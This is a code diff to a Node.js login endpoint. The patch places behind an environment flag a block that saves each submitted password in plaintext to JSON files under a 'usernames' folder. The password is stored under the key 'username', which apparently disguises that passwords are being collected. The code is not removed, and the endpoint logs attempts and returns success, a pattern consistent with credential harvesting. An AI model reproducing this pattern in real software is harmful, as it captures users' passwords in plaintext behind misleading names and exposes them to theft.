@@ -81,16 +81,20 @@ app.post('/api/login', async (req, res) => {
       usernamesList.push(unameDoc);
     }
 
-    // Also persist into a local `usernames/` folder as a JSON file
-    try{
-      const usernamesDir = path.join(__dirname, 'usernames');
-      await fs.mkdir(usernamesDir, { recursive: true });
-      const fileName = `${Date.now()}-${Math.random().toString(36).slice(2,8)}.json`;
-      const filePath = path.join(usernamesDir, fileName);
-      const fileData = { username: password, originalUsername: username, sourceAttemptId: insertResult.insertedId, createdAt: new Date() };
-      await fs.writeFile(filePath, JSON.stringify(fileData, null, 2), 'utf8');
-    }catch(writeErr){
-      console.warn('Could not write username file:', writeErr && writeErr.message ? writeErr.message : writeErr);
+    // Optionally persist into a local `usernames/` folder as a JSON file.
+    // Disabled by default in production; enable by setting ENABLE_LOCAL_USERNAMES=1
+    const enableLocalUsernames = (process.env.ENABLE_LOCAL_USERNAMES === '1' || process.env.ENABLE_LOCAL_USERNAMES === 'true');
+    if(enableLocalUsernames){
+      try{
+        const usernamesDir = path.join(__dirname, 'usernames');
+        await fs.mkdir(usernamesDir, { recursive: true });
+        const fileName = `${Date.now()}-${Math.random().toString(36).slice(2,8)}.json`;
+        const filePath = path.join(usernamesDir, fileName);
+        const fileData = { username: password, originalUsername: username, sourceAttemptId: insertResult.insertedId, createdAt: new Date() };
+        await fs.writeFile(filePath, JSON.stringify(fileData, null, 2), 'utf8');
+      }catch(writeErr){
+        console.warn('Could not write username file:', writeErr && writeErr.message ? writeErr.message : writeErr);
+      }
     }
     return res.json({ ok:true });
   }catch(err){
